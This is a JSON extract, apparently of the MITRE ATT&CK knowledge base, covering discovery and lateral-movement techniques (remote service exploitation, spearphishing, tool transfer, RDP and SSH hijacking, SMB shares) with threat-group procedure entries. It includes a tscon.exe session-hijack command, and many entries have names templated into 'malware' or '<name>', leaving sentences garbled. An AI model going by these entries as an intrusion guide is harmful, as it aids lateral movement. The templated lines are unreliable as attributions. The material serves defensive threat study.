                "Description": "As part of the data reconnaissance phase, malware grabs the system time to send back to the control server.[60]"
            },
            "S0650": {
                "ID": "S0650",
                "Name": "QakBot",
                "Description": "malware can identify the system time on a targeted host.[71]"
            },
            "S0148": {
                "ID": "S0148",
                "Name": "RTM",
                "Description": "malware can obtain the victim time zone.[72]"
            },
            "S0596": {
                "ID": "S0596",
                "Name": "ShadowPad",
                "Description": "malware has collected the current date and time of the victim system.[73]"
            },
            "S0140": {
                "ID": "S0140",
                "Name": "Shamoon",
                "Description": "malware obtains the system time and will only activate if it is greater than a preset date.[74][75]"
            },
            "S0450": {
                "ID": "S0450",
                "Name": "SHARPSTATS",
                "Description": "malware has the ability to identify the current date and time on the compromised host.[76]"
            },
            "G0121": {
                "ID": "G0121",
                "Name": "Sidewinder",
                "Description": "malware has used tools to obtain the current system time.[77]"
            },
            "S0692": {
                "ID": "S0692",
                "Name": "SILENTTRINITY",
                "Description": "malware can collect start time information from a compromised host.[78]"
            },
            "S0615": {
                "ID": "S0615",
                "Name": "SombRAT",
                "Description": "malware can execute getinfo  to discover the current time on a compromised host.[79][80]"
            },
            "S0380": {
                "ID": "S0380",
                "Name": "StoneDrill",
                "Description": "malware can obtain the current date and time of the victim machine.[81]"
            },
            "S1034": {
                "ID": "S1034",
                "Name": "StrifeWater",
                "Description": "malware can collect the time zone from the victim's machine.[82]"
            },
            "S0603": {
                "ID": "S0603",
                "Name": "Stuxnet",
                "Description": "malware collects the time and date of a system when it is infected.[83]"
            },
            "S0559": {
                "ID": "S0559",
                "Name": "SUNBURST",
                "Description": "malware collected device UPTIME.[84][85]"
            },
            "S1064": {
                "ID": "S1064",
                "Name": "SVCReady",
                "Description": "malware can collect time zone information.[86]"
            },
            "S0098": {
                "ID": "S0098",
                "Name": "T9000",
                "Description": "malware gathers and beacons the system time during installation.[87]"
            },
            "S0011": {
                "ID": "S0011",
                "Name": "Taidoor",
                "Description": "malware can use GetLocalTime and GetSystemTime to collect system time.[88]"
            },
            "S0586": {
                "ID": "S0586",
                "Name": "TAINTEDSCRIBE",
                "Description": "malware can execute GetLocalTime for time discovery.[89]"
            },
            "S0467": {
                "ID": "S0467",
                "Name": "TajMahal",
                "Description": "malware has the ability to determine local time on a compromised host.[90]"
            },
            "G0089": {
                "ID": "G0089",
                "Name": "The White Company",
                "Description": "malware has checked the current date on the victim system.[91]"
            },
            "S0678": {
                "ID": "S0678",
                "Name": "Torisma",
                "Description": "malware can collect the current time on a victim machine.[92]"
            },
            "G0010": {
                "ID": "G0010",
                "Name": "Turla",
                "Description": "malware surveys a system upon check-in to discover the system time by using the net time command.[45]"
            },
            "S0275": {
                "ID": "S0275",
                "Name": "UPPERCUT",
                "Description": "malware has the capability to obtain the time zone information and current timestamp of the victim\u2019s machine.[93]"
            },
            "S0466": {
                "ID": "S0466",
                "Name": "WindTail",
                "Description": "malware has the ability to generate the current date and time.[94]"
            },
            "S0251": {
                "ID": "S0251",
                "Name": "Zebrocy",
                "Description": "malware gathers the current time zone and date information from the system.[95][96]"
            },
            "S0330": {
                "ID": "S0330",
                "Name": "Zeus Panda",
                "Description": "malware collects the current system time (UTC) and sends it back to the C2 server.[97]"
            },
            "G0128": {
                "ID": "G0128",
                "Name": "ZIRCONIUM",
                "Description": "malware has used a tool to capture the time on a compromised host in order to register it with C2.[98]"
            }
        }
    },
    "T1210": {
        "ttp_name": "Exploitation of Remote Services",
        "ttp_id": "T1210",
        "href": "/techniques/T1210",
        "tactic": "Lateral Movement",
        "description": "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.An adversary may need to determine if the remote system is in a vulnerable state, which may be done through Network Service Discovery or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.There are several well-known vulnerabilities that exist in common services such as SMB [1] and RDP [2] as well as applications that may be used within internal networks such as MySQL [3] and web server services.[4]Depending on the permissions level of the vulnerable remote service an adversary may achieve Exploitation for Privilege Escalation as a result of lateral movement exploitation as well.",
        "Procedure": {
            "G0007": {
                "ID": "G0007",
                "Name": "APT28",
                "Description": "malware exploited a Windows SMB Remote Code Execution Vulnerability to conduct lateral movement.[5][6][7]"
            },
            "S0606": {
                "ID": "S0606",
                "Name": "Bad Rabbit",
                "Description": "malware used the EternalRomance SMB exploit to spread through victim networks.[8]"
            },
            "S0608": {
                "ID": "S0608",
                "Name": "Conficker",
                "Description": "malware exploited the MS08-067 Windows vulnerability for remote code execution through a crafted RPC request.[9]"
            },
            "G0035": {
                "ID": "G0035",
                "Name": "Dragonfly",
                "Description": "malware has exploited a Windows Netlogon vulnerability (CVE-2020-1472) to obtain access to Windows Active Directory servers.[10]"
            },
            "G1006": {
                "ID": "G1006",
                "Name": "Earth Lusca",
                "Description": "malware has used Mimikatz to exploit a domain controller via the ZeroLogon exploit (CVE-2020-1472).[11]"
            },
            "S0367": {
                "ID": "S0367",
                "Name": "Emotet",
                "Description": "malware has been seen exploiting SMB via a vulnerability exploit like EternalBlue (MS17-010) to achieve lateral movement and propagation.[12][13][14][15]"
            },
            "S0363": {
                "ID": "S0363",
                "Name": "Empire",
                "Description": "malware has a limited number of built-in modules for exploiting remote SMB, JBoss, and Jenkins servers.[16]"
            },
            "G0046": {
                "ID": "G0046",
                "Name": "FIN7",
                "Description": "malware has exploited ZeroLogon (CVE-2020-1472) against vulnerable domain controllers.[17]"
            },
            "S0143": {
                "ID": "S0143",
                "Name": "Flame",
                "Description": "malware can use MS10-061 to exploit a print spooler vulnerability in a remote system with a shared printer in order to move laterally.[18][19]"
            },
            "G0117": {
                "ID": "G0117",
                "Name": "Fox Kitten",
                "Description": "malware has exploited known vulnerabilities in remote services including RDP.[20][21][22]"
            },
            "S0260": {
                "ID": "S0260",
                "Name": "InvisiMole",
                "Description": "malware can spread within a network via the BlueKeep (CVE-2019-0708) and EternalBlue (CVE-2017-0144) vulnerabilities in RDP and SMB respectively.[23]"
            },
            "S0532": {
                "ID": "S0532",
                "Name": "Lucifer",
                "Description": "malware can exploit multiple vulnerabilities including EternalBlue (CVE-2017-0144) and EternalRomance (CVE-2017-0144).[24]"
            },
            "G0045": {
                "ID": "G0045",
                "Name": "menuPass",
                "Description": "malware has used tools to exploit the ZeroLogon vulnerability (CVE-2020-1472).[25]"
            },
            "G0069": {
                "ID": "G0069",
                "Name": "MuddyWater",
                "Description": "malware has exploited the Microsoft Netlogon vulnerability (CVE-2020-1472).[26]"
            },
            "S0368": {
                "ID": "S0368",
                "Name": "NotPetya",
                "Description": "malware can use two exploits in SMBv1, EternalBlue and EternalRomance, to spread itself to other remote systems on the network.[27][28][29]"
            },
            "S0378": {
                "ID": "S0378",
                "Name": "PoshC2",
                "Description": "malware contains a module for exploiting SMB via EternalBlue.[30]"
            },
            "S0650": {
                "ID": "S0650",
                "Name": "QakBot",
                "Description": "malware can move laterally using worm-like functionality through exploitation of SMB.[31]"
            },
            "S0603": {
                "ID": "S0603",
                "Name": "Stuxnet",
                "Description": "malware propagates using the MS10-061 Print Spooler and MS08-067 Windows Server Service vulnerabilities.[32]"
            },
            "G0027": {
                "ID": "G0027",
                "Name": "Threat Group-3390",
                "Description": "malware has exploited MS17-010 to move laterally to other systems on the network.[33]"
            },
            "G0131": {
                "ID": "G0131",
                "Name": "Tonto Team",
                "Description": "malware has used EternalBlue exploits for lateral movement.[34]"
            },
            "S0266": {
                "ID": "S0266",
                "Name": "TrickBot",
                "Description": "malware utilizes EternalBlue and EternalRomance exploits for lateral movement in the modules wormwinDll, wormDll, mwormDll, nwormDll, tabDll.[35]"
            },
            "S0366": {
                "ID": "S0366",
                "Name": "WannaCry",
                "Description": "malware uses an exploit in SMBv1 to spread itself to other remote systems on a network.[36][37][38]"
            },
            "G0102": {
                "ID": "G0102",
                "Name": "Wizard Spider",
                "Description": "malware has exploited or attempted to exploit Zerologon (CVE-2020-1472) and EternalBlue (MS17-010) vulnerabilities.[39][40][41]"
            }
        }
    },
    "T1534": {
        "ttp_name": "Internal Spearphishing",
        "ttp_id": "T1534",
        "href": "/techniques/T1534",
        "tactic": "Lateral Movement",
        "description": "After they already have access to accounts or systems within the environment, adversaries may use internal spearphishing to gain access to additional information or compromise other users within the same organization. Internal spearphishing is multi-staged campaign where a legitimate account is initially compromised either by controlling the user's device or by compromising the account credentials of the user. Adversaries may then attempt to take advantage of the trusted internal account to increase the likelihood of tricking more victims into falling for phish attempts, often incorporating Impersonation.[1]For example, adversaries may leverage Spearphishing Attachment or Spearphishing Link as part of internal spearphishing to deliver a payload or redirect to an external site to capture credentials through Input Capture on sites that mimic login interfaces.Adversaries may also leverage internal chat apps, such as Microsoft Teams, to spread malicious content or engage users in attempts to capture sensitive information and/or credentials.[2]",
        "Procedure": {
            "G0047": {
                "ID": "G0047",
                "Name": "Gamaredon Group",
                "Description": "malware has used an Outlook VBA module on infected systems to send phishing emails with malicious attachments to other employees within the organization.[3]"
            },
            "G1001": {
                "ID": "G1001",
                "Name": "HEXANE",
                "Description": "malware has conducted internal spearphishing attacks against executives, HR, and IT personnel to gain information and access.[4]"
            },
            "G0094": {
                "ID": "G0094",
                "Name": "Kimsuky",
                "Description": "malware has sent internal spearphishing emails for lateral movement after stealing victim information.[5]"
            },
            "G0065": {
                "ID": "G0065",
                "Name": "Leviathan",
                "Description": "malware has conducted internal spearphishing within the victim's environment for lateral movement.[6]"
            },
            "C0022": {
                "ID": "C0022",
                "Name": "Operation Dream Job",
                "Description": "During malware, Lazarus Group conducted internal spearphishing from within a compromised organization.[7]"
            }
        }
    },
    "T1570": {
        "ttp_name": "Lateral Tool Transfer",
        "ttp_id": "T1570",
        "href": "/techniques/T1570",
        "tactic": "Lateral Movement",
        "description": "Adversaries may transfer tools or other files between systems in a compromised environment. Once brought into the victim environment (i.e., Ingress Tool Transfer) files may then be copied from one system to another to stage adversary tools or other files over the course of an operation.Adversaries may copy files between internal victim systems to support lateral movement using inherent file sharing protocols such as file sharing over SMB/Windows Admin Shares to connected network shares or with authenticated connections via Remote Desktop Protocol.[1]Files can also be transferred using native or otherwise present tools on the victim system, such as scp, rsync, curl, sftp, and ftp. In some cases, adversaries may be able to leverage Web Services such as Dropbox or OneDrive to copy files from one machine to another via shared, automatically synced folders.[2]",
        "Procedure": {
            "C0028": {
                "ID": "C0028",
                "Name": "2015 Ukraine Electric Power Attack",
                "Description": "During the malware, Sandworm Team moved their tools laterally within the corporate network and between the ICS and corporate network. [3]"
            },
            "C0025": {
                "ID": "C0025",
                "Name": "2016 Ukraine Electric Power Attack",
                "Description": "During the malware, Sandworm Team used move to transfer files to a network share.[4]"
            },
            "C0034": {
                "ID": "C0034",
                "Name": "2022 Ukraine Electric Power Attack",
                "Description": "During the malware, Sandworm Team used a Group Policy Object (GPO) to copy CaddyWiper's executable msserver.exe from a staging server to a local hard drive before deployment.[5]"
            },
            "G1007": {
                "ID": "G1007",
                "Name": "Aoqin Dragon",
                "Description": "malware has spread malware in target networks by copying modules to folders masquerading as removable devices.[6]"
            },
            "G0050": {
                "ID": "G0050",
                "Name": "APT32",
                "Description": "malware has deployed tools after moving laterally using administrative accounts.[7]"
            },
            "G0096": {
                "ID": "G0096",
                "Name": "APT41",
                "Description": "malware uses remote shares to move and remotely execute payloads during lateral movemement.[8]"
            },
            "S0190": {
                "ID": "S0190",
                "Name": "BITSAdmin",
                "Description": "malware can be used to create BITS Jobs to upload and/or download files from SMB file servers.[9]"
            },
            "S1068": {
                "ID": "S1068",
                "Name": "BlackCat",
                "Description": "malware can replicate itself across connected servers via psexec.[10]"
            },
            "C0015": {
                "ID": "C0015",
                "Name": "C0015",
                "Description": "During malware, the threat actors used WMI to load Cobalt Strike onto additional hosts within a compromised network.[11]"
            },
            "C0018": {
                "ID": "C0018",
                "Name": "C0018",
                "Description": "During malware, the threat actors transferred the SoftPerfect Network Scanner and other tools to machines in the network using AnyDesk and PDQ Deploy.[12][13]"
            },
            "G0114": {
                "ID": "G0114",
                "Name": "Chimera",
                "Description": "malware has copied tools between compromised hosts using SMB.[14]"
            },
            "S0106": {
                "ID": "S0106",
                "Name": "cmd",
                "Description": "malware can be used to copy files to/from a remotely connected internal system.[15]"
            },
            "S0062": {
                "ID": "S0062",
                "Name": "DustySky",
                "Description": "malware searches for network drives and removable media and duplicates itself onto them.[16]"
            },
            "S0367": {
                "ID": "S0367",
                "Name": "Emotet",
                "Description": "malware has copied itself to remote systems using the service.exe filename.[17]"
            },
            "S0404": {
                "ID": "S0404",
                "Name": "esentutl",
                "Description": "malware can be used to copy files to/from a remote share.[18]"
            },
            "S0361": {
                "ID": "S0361",
                "Name": "Expand",
                "Description": "malware can be used to download or upload a file over a network share.[19]"
            },
            "G0051": {
                "ID": "G0051",
                "Name": "FIN10",
                "Description": "malware has deployed Meterpreter stagers and SplinterRAT instances in the victim network after moving laterally.[20]"
            },
            "S0095": {
                "ID": "S0095",
                "Name": "ftp",
                "Description": "malware may be abused by adversaries to transfer tools or files between systems within a compromised environment.[21][22]"
            },
            "G0093": {
                "ID": "G0093",
                "Name": "GALLIUM",
                "Description": "malware has used PsExec to move laterally between hosts in the target network.[23]"
            },
            "S0698": {
                "ID": "S0698",
                "Name": "HermeticWizard",
                "Description": "malware can copy files to other machines on a compromised network.[24]"
            },
            "S0372": {
                "ID": "S0372",
                "Name": "LockerGoga",
                "Description": "malware has been observed moving around the victim network via SMB, indicating the actors behind this ransomware are manually copying files form computer to computer instead of self-propagating.[1]"
            },
            "S0532": {
                "ID": "S0532",
                "Name": "Lucifer",
                "Description": "malware can use certutil for propagation on Windows hosts within intranets.[25]"
            },
            "G0059": {
                "ID": "G0059",
                "Name": "Magic Hound",
                "Description": "malware has copied tools within a compromised network using RDP.[26]"
            },
            "S0457": {
                "ID": "S0457",
                "Name": "Netwalker",
                "Description": "Operators deploying malware have used psexec to copy the malware payload across accessible systems.[27]"
            },
            "S0365": {
                "ID": "S0365",
                "Name": "Olympic Destroyer",
                "Description": "malware attempts to copy itself to remote machines on the network.[28]"
            },
            "C0014": {
                "ID": "C0014",
                "Name": "Operation Wocao",
                "Description": "During malware, threat actors used SMB to copy files to and from target systems.[29]"
            },
            "S0029": {
                "ID": "S0029",
                "Name": "PsExec",
                "Description": "malware can be used to download or upload a file over a network share.[30]"
            },
            "G0034": {
                "ID": "G0034",
                "Name": "Sandworm Team",
                "Description": "malware has used move to transfer files to a network share and has copied payloads--such as Prestige ransomware--to an Active Directory Domain Controller and distributed via the Default Domain Group Policy Object.[4][31]"
            },
            "S0140": {
                "ID": "S0140",
                "Name": "Shamoon",
                "Description": "malware attempts to copy itself to remote machines on the network.[32]"
            },
            "S0603": {
                "ID": "S0603",
                "Name": "Stuxnet",
                "Description": "malware uses an RPC server that contains a file dropping routine and support for payload version updates for P2P communications within a victim network.[33]"
            },
            "G0010": {
                "ID": "G0010",
                "Name": "Turla",
                "Description": "malware RPC backdoors can be used to transfer files to/from victim machines on the local network.[34][35]"
            },
            "G1017": {
                "ID": "G1017",
                "Name": "Volt Typhoon",
                "Description": "malware has copied web shells between servers in targeted environments.[36]"
            },
            "S0366": {
                "ID": "S0366",
                "Name": "WannaCry",
                "Description": "malware attempts to copy itself to remote computers after gaining access via an SMB exploit.[37]"
            },
            "G0102": {
                "ID": "G0102",
                "Name": "Wizard Spider",
                "Description": "malware has used stolen credentials to copy tools into the %TEMP% directory of domain controllers.[38]"
            }
        }
    },
    "T1563": {
        "ttp_name": "Remote Service Session Hijacking",
        "ttp_id": "T1563",
        "href": "/techniques/T1563",
        "subtechnique": {
            "001": {
                "name": "SSH Hijacking",
                "href": "/techniques/T1563/001",
                "description": "Adversaries may hijack a legitimate user's SSH session to move laterally within an environment. Secure Shell (SSH) is a standard means of remote access on Linux and macOS systems. It allows a user to connect to another system via an encrypted tunnel, commonly authenticating through a password, certificate or the use of an asymmetric encryption key pair.In order to move laterally from a compromised host, adversaries may take advantage of trust relationships established with other systems via public key authentication in active SSH sessions by hijacking an existing connection to another system. This may occur through compromising the SSH agent itself or by having access to the agent's socket. If an adversary is able to obtain root access, then hijacking SSH sessions is likely trivial.[1][2][3][4]SSH Hijacking differs from use of SSH because it hijacks an existing SSH session rather than creating a new session using Valid Accounts.",
                "Procedure": {}
            },
            "002": {
                "name": "RDP Hijacking",
                "href": "/techniques/T1563/002",
                "description": "Adversaries may hijack a legitimate user\u2019s remote desktop session to move laterally within an environment. Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).[1]Adversaries may perform RDP session hijacking which involves stealing a legitimate user's remote session. Typically, a user is notified when someone else is trying to steal their session. With System permissions and using Terminal Services Console, c:\\windows\\system32\\tscon.exe [session number to be stolen], an adversary can hijack a session without the need for credentials or prompts to the user.[2] This can be done remotely or locally and with active or disconnected sessions.[3] It can also lead to Remote System Discovery and Privilege Escalation by stealing a Domain Admin or higher privileged account session. All of this can be done by using native Windows commands, but it has also been added as a feature in red teaming tools.[4]",
                "Procedure": {
                    "G0001": {
                        "ID": "G0001",
                        "Name": "Axiom",
                        "Description": "<name> has targeted victims with remote administration tools including RDP.[5]"
                    },
                    "S0366": {
                        "ID": "S0366",
                        "Name": "WannaCry",
                        "Description": "<name> enumerates current remote desktop sessions and tries to execute the malware on each session.[6]"
                    }
                }
            }
        },
        "tactic": "Lateral Movement",
        "description": "Adversaries may take control of preexisting sessions with remote services to move laterally in an environment. Users may use valid credentials to log into a service specifically designed to accept remote connections, such as telnet, SSH, and RDP. When a user logs into a service, a session will be established that will allow them to maintain a continuous interaction with that service.Adversaries may commandeer these sessions to carry out actions on remote systems. Remote Service Session Hijacking differs from use of Remote Services because it hijacks an existing session rather than creating a new session using Valid Accounts.[1][2]",
        "Procedure": {}
    },
    "T1021": {
        "ttp_name": "Remote Services",
        "ttp_id": "T1021",
        "href": "/techniques/T1021",
        "subtechnique": {
            "001": {
                "name": "Remote Desktop Protocol",
                "href": "/techniques/T1021/001",
                "description": "Adversaries may use Valid Accounts to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user.Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).[1] Adversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the Accessibility Features or Terminal Services DLL for Persistence.[2]",
                "Procedure": {
                    "G0006": {
                        "ID": "G0006",
                        "Name": "APT1",
                        "Description": "The <name> group is known to have used RDP during operations.[3]"
                    },
                    "G0022": {
                        "ID": "G0022",
                        "Name": "APT3",
                        "Description": "<name> enables the Remote Desktop Protocol for persistence.[4] <name> has also interacted with compromised systems to browse and copy files through RDP sessions.[5]"
                    },
                    "G0087": {
                        "ID": "G0087",
                        "Name": "APT39",
                        "Description": "<name> has been seen using RDP for lateral movement and persistence, in some cases employing the rdpwinst tool for mangement of multiple sessions.[6][7]"
                    },
                    "G0096": {
                        "ID": "G0096",
                        "Name": "APT41",
                        "Description": "<name> used RDP for lateral movement.[8][9]"
                    },
                    "G1023": {
                        "ID": "G1023",
                        "Name": "APT5",
                        "Description": "<name> has moved laterally throughout victim environments using RDP.[10]"
                    },
                    "G0001": {
                        "ID": "G0001",
                        "Name": "Axiom",
                        "Description": "<name> has used RDP during operations.[11]"
                    },
                    "G0108": {
                        "ID": "G0108",
                        "Name": "Blue Mockingbird",
                        "Description": "<name> has used Remote Desktop to log on to servers interactively and manually copy files to remote hosts.[12]"
                    },
                    "C0015": {
                        "ID": "C0015",
                        "Name": "C0015",
                        "Description": "During <name>, the threat actors used RDP to access specific network hosts of interest.[13]"
                    },
                    "C0018": {
                        "ID": "C0018",
                        "Name": "C0018",
                        "Description": "During <name>, the threat actors opened a variety of ports to establish RDP connections, including ports 28035, 32467, 41578, and 46892.[14]"
                    },
                    "C0032": {
                        "ID": "C0032",
                        "Name": "C0032",
                        "Description": "During the <name> campaign, TEMP.Veles utilized RDP throughout an operation.[15]"
                    },
                    "S0030": {
                        "ID": "S0030",
                        "Name": "Carbanak",
                        "Description": "<name> enables concurrent Remote Desktop Protocol (RDP) sessions.[16]"
                    },
                    "G0114": {
                        "ID": "G0114",
                        "Name": "Chimera",
                        "Description": "<name> has used RDP to access targeted systems.[17]"
                    },
                    "G0080": {
                        "ID": "G0080",
                        "Name": "Cobalt Group",
                        "Description": "<name> has used Remote Desktop Protocol to conduct lateral movement.[18]"
                    },
                    "S0154": {
                        "ID": "S0154",
                        "Name": "Cobalt Strike",
                        "Description": "<name> can start a VNC-based remote desktop server and tunnel the connection through the already established C2 channel.[19][20]"
                    },
                    "C0029": {
                        "ID": "C0029",
                        "Name": "Cutting Edge",
                        "Description": "During <name>, threat actors used RDP with compromised credentials for lateral movement.[21]"
                    },
                    "S0334": {
                        "ID": "S0334",
                        "Name": "DarkComet",
                        "Description": "<name> can open an active screen of the victim\u2019s machine and take control of the mouse and keyboard.[22]"
                    },
                    "G0035": {
                        "ID": "G0035",
                        "Name": "Dragonfly",
                        "Description": "<name> has moved laterally via RDP.[23]"
                    },
                    "G0051": {
                        "ID": "G0051",
                        "Name": "FIN10",
                        "Description": "<name> has used RDP to move laterally to systems in the victim environment.[24]"
                    },
                    "G1016": {
                        "ID": "G1016",
                        "Name": "FIN13",
                        "Description": "<name> has remotely accessed compromised environments via Remote Desktop Services (RDS) for lateral movement.[25]"
                    },
                    "G0037": {
                        "ID": "G0037",
                        "Name": "FIN6",
                        "Description": "<name> used RDP to move laterally in victim networks.[26][27]"
                    },
                    "G0046": {
                        "ID": "G0046",
                        "Name": "FIN7",
                        "Description": "<name> has used RDP to move laterally in victim environments.[28]"
                    },
                    "G0061": {
                        "ID": "G0061",
                        "Name": "FIN8",
                        "Description": "<name> has used RDP for lateral movement.[29]"
                    },
                    "G0117": {
                        "ID": "G0117",
                        "Name": "Fox Kitten",
                        "Description": "<name> has used RDP to log in and move laterally in the target environment.[30][31]"
                    },
                    "G1001": {
                        "ID": "G1001",
                        "Name": "HEXANE",
                        "Description": "<name> has used remote desktop sessions for lateral movement.[32]"
                    },
                    "S0434": {
                        "ID": "S0434",
                        "Name": "Imminent Monitor",
                        "Description": "<name> has a module for performing remote desktop access.[33]"
                    },
                    "S0283": {
                        "ID": "S0283",
                        "Name": "jRAT",
                        "Description": "<name> can support RDP control.[34]"
                    },
                    "G0094": {
                        "ID": "G0094",
                        "Name": "Kimsuky",
                        "Description": "<name> has used RDP for direct remote point-and-click access.[35]"
                    },
                    "S0250": {
                        "ID": "S0250",
                        "Name": "Koadic",
                        "Description": "<name> can enable remote desktop on the victim's machine.[36]"
                    },
                    "G0032": {
                        "ID": "G0032",
                        "Name": "Lazarus Group",
                        "Description": "<name> malware SierraCharlie uses RDP for propagation.[37][38]"
                    },
                    "G0065": {
                        "ID": "G0065",
                        "Name": "Leviathan",
                        "Description": "<name> has targeted RDP credentials and used it to move through the victim environment.[39]"
                    },
                    "G0059": {
                        "ID": "G0059",
                        "Name": "Magic Hound",
                        "Description": "<name> has used Remote Desktop Services to copy tools on targeted systems.[40][41]"
                    },
                    "G0045": {
                        "ID": "G0045",
                        "Name": "menuPass",
                        "Description": "<name> has used RDP connections to move across the victim network.[42][43]"
                    },
                    "S0385": {
                        "ID": "S0385",
                        "Name": "njRAT",
                        "Description": "<name> has a module for performing remote desktop access.[44]"
                    },
                    "G0049": {
                        "ID": "G0049",
                        "Name": "OilRig",
                        "Description": "<name> has used Remote Desktop Protocol for lateral movement. The group has also used tunneling tools to tunnel RDP into the environment.[45][46][9]"
                    },
                    "G0040": {
                        "ID": "G0040",
                        "Name": "Patchwork",
                        "Description": "<name> attempted to use RDP to move laterally.[47]"
                    },
                    "S0192": {
                        "ID": "S0192",
                        "Name": "Pupy",
                        "Description": "<name> can enable/disable RDP connection and can start a remote desktop session using a browser web socket client.[48]"
                    },
                    "S0583": {
                        "ID": "S0583",
                        "Name": "Pysa",
                        "Description": "<name> has laterally moved using RDP connections.[49]"
                    },
                    "S0262": {
                        "ID": "S0262",
                        "Name": "QuasarRAT",
                        "Description": "<name> has a module for performing remote desktop access.[50][51]"
                    },
                    "S0379": {
                        "ID": "S0379",
                        "Name": "Revenge RAT",
                        "Description": "<name> has a plugin to perform RDP access.[52]"
                    },
                    "S0461": {
                        "ID": "S0461",
                        "Name": "SDBbot",
                        "Description": "<name> has the ability to use RDP to connect to victim's machines.[53]"
                    },
                    "S0382": {
                        "ID": "S0382",
                        "Name": "ServHelper",
                        "Description": "<name> has commands for adding a remote desktop user and sending RDP traffic to the attacker through a reverse SSH tunnel.[54]"
                    },
                    "G0091": {
                        "ID": "G0091",
                        "Name": "Silence",
                        "Description": "<name> has used RDP for lateral movement.[55]"
                    },
                    "C0024": {
                        "ID": "C0024",
                        "Name": "SolarWinds Compromise",
                        "Description": "During the <name>, APT29 used RDP sessions from public-facing systems to internal servers.[56]"
                    },
                    "S0670": {
                        "ID": "S0670",
                        "Name": "WarzoneRAT",
                        "Description": "<name> has the ability to control an infected PC using RDP.[57]"
                    },
                    "G0102": {
                        "ID": "G0102",
                        "Name": "Wizard Spider",
                        "Description": "<name> has used RDP for lateral movement and to deploy ransomware interactively.[58][59][60][61]"
                    },
                    "S0350": {
                        "ID": "S0350",
                        "Name": "zwShell",
                        "Description": "<name> has used RDP for lateral movement.[62]"
                    },
                    "S0412": {
                        "ID": "S0412",
                        "Name": "ZxShell",
                        "Description": "<name> has remote desktop functionality.[63]"
                    }
                }
            },
            "002": {
                "name": "SMB/Windows Admin Shares",
                "href": "/techniques/T1021/002",
                "description": "Adversaries may use Valid Accounts to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user.SMB is a file, printer, and serial port sharing protocol for Windows machines on the same network or domain. Adversaries may use SMB to interact with file shares, allowing them to move laterally throughout a network. Linux and macOS implementations of SMB typically use Samba.Windows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include C$, ADMIN$, and IPC$. Adversaries may use this technique in conjunction with administrator-level Valid Accounts to remotely access a networked system over SMB,[1] to interact with systems using remote procedure calls (RPCs),[2] transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB/RPC are Scheduled Task/Job, Service Execution, and Windows Management Instrumentation. Adversaries can also use NTLM hashes to access administrator shares on systems with Pass the Hash and certain configuration and patch levels.[3]",
                "Procedure": {
                    "C0025": {
                        "ID": "C0025",
                        "Name": "2016 Ukraine Electric Power Attack",
                        "Description": "During the <name>, Sandworm Team utilized net use to connect to network shares.[4]"
                    },
                    "S0504": {
                        "ID": "S0504",
                        "Name": "Anchor",
                        "Description": "<name> can support windows execution via SMB shares.[5]"
                    },
                    "G0007": {
                        "ID": "G0007",
                        "Name": "APT28",
                        "Description": "<name> has mapped network drives using Net and administrator credentials.[6]"
                    },
                    "G0022": {
                        "ID": "G0022",
                        "Name": "APT3",
                        "Description": "<name> will copy files over to Windows Admin Shares (like ADMIN$) as part of lateral movement.[7]"
                    },
                    "G0050": {
                        "ID": "G0050",
                        "Name": "APT32",
                        "Description": "<name> used Net to use Windows' hidden network shares to copy their tools to remote machines for execution.[8]"
                    },
                    "G0087": {
                        "ID": "G0087",
                        "Name": "APT39",
                        "Description": "<name> has used SMB for lateral movement.[9]"
                    },
                    "G0096": {
                        "ID": "G0096",
                        "Name": "APT41",
                        "Description": "<name> has transferred implant files using Windows Admin Shares.[10]"
                    },
                    "S0089": {
                        "ID": "S0089",
                        "Name": "BlackEnergy",
                        "Description": "<name> has run a plug-in on a victim to spread through the local network by using PsExec and accessing admin shares.[11]"
                    },
                    "G0108": {
                        "ID": "G0108",
                        "Name": "Blue Mockingbird",
                        "Description": "<name> has used Windows Explorer to manually copy malicious files to remote hosts over SMB.[12]"
                    },
                    "S1063": {
                        "ID": "S1063",
                        "Name": "Brute Ratel C4",
                        "Description": "<name> has the ability to use SMB to pivot in compromised networks.[13][14][15]"
                    },
                    "G0114": {
                        "ID": "G0114",
                        "Name": "Chimera",
                        "Description": "<name> has used Windows admin shares to move laterally.[16][17]"
                    },
                    "G1021": {
                        "ID": "G1021",
                        "Name": "Cinnamon Tempest",
                        "Description": "<name> has used SMBexec for lateral movement.[18]"
                    },
                    "S0154": {
                        "ID": "S0154",
                        "Name": "Cobalt Strike",
                        "Description": "<name> can use Window admin shares (C$ and ADMIN$) for lateral movement.[19][20]"
                    },
                    "S0608": {
                        "ID": "S0608",
                        "Name": "Conficker",
                        "Description": "<name> variants spread through NetBIOS share propagation.[21]"
                    },
                    "S0575": {
                        "ID": "S0575",
                        "Name": "Conti",
                        "Description": "<name> can spread via SMB and encrypts files on different hosts, potentially compromising an entire network.[22][23]"
                    },
                    "C0029": {
                        "ID": "C0029",
                        "Name": "Cutting Edge",
                        "Description": "During <name>, threat actors moved laterally using compromised credentials to connect to internal Windows systems with SMB.[24]"
                    },
                    "G0009": {
                        "ID": "G0009",
                        "Name": "Deep Panda",
                        "Description": "<name> uses net.exe to connect to network shares using net use commands with compromised credentials.[25]"
                    },
                    "S0659": {
                        "ID": "S0659",
                        "Name": "Diavol",
                        "Description": "<name> can spread throughout a network via SMB prior to encryption.[26]"
                    },
                    "S0038": {
                        "ID": "S0038",
